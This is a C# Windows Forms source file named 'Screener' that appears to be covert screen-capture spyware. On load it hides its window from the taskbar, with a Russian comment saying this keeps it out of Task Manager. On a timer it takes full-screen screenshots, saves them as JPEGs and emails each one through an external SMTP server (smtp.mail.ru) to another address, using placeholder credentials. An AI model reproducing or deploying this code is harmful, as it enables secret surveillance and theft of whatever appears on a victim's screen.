using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net.Mime;


namespace Screener
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

       //http://www.cyberforum.ru/csharp-beginners/thread369111.html

        int kol = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            FormBorderStyle = FormBorderStyle.FixedToolWindow;//Эта штука скрывает нашу прогу от диспетчера
            //FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Minimized;
            Height = 0;
            Width = 0;
            ShowIcon = false;
            ShowInTaskbar = false;
            
        }

        private void Screen_Tick(object sender, EventArgs e)
        {
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Graphics graphics = Graphics.FromImage(printscreen as Image);

            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);

            printscreen.Save(@"E:\printscreen"+kol.ToString()+".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

            //
            //Порт SMTP - 25, 587 или 2525
            SmtpClient smtp = new SmtpClient("smtp.mail.ru", 25);
            smtp.EnableSsl = true; 
            smtp.Credentials = new System.Net.NetworkCredential("mail1@mail.ru", "password");
            

            MailMessage mail = new MailMessage();
            mail.From = new MailAddress("mail1@mail.ru");
            mail.To.Add(new MailAddress("mail2@mail.ru"));
            mail.Subject = "Subject";
            mail.Body = "Body";

            string file = @"E:\printscreen"+kol.ToString()+".jpg";
            Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
            mail.Attachments.Add(attach);

            smtp.Send(mail);
            ////////////////////////////////////////////////////

            kol++;
        }
    }
}
